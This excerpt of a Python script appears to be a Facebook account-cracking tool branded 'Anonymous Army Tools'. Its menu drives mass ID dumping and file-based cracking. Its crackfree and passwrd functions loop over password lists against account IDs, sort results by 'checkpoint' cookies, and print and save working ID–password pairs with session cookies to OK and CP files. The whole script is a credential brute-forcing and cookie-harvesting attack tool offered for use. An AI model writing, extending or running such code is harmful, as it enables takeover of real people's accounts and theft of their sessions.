...
os.system('espeak -a 300 " Welcome,   to,  Anonymous  , Army ,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    Anonymous = input('\x1b[1;92m[+] CHOOSE: ')
    if Anonymous in ['111']:
        login()
        dump_massal()
    elif Anonymous in ['1']:
        crack_file()
    elif Anonymous in ['2', '02']:
        os.system('xdg-open https://wa.me/+8801600107886')
        os.system("python nono.py")
    elif Anonymous in ['3', '03']:
        result()
    elif Anonymous in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Anonymous.txt  Etc...]')
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[97;1m•\033[97;1m] \033[1;92mTool version 0.1 ')
    print('\033[0;97m===============================================')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[Cyber-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Anonymous-Ok🔥] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf, pwv):
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•Anonymous-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                ...
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Anonymous-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Anonymous,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break
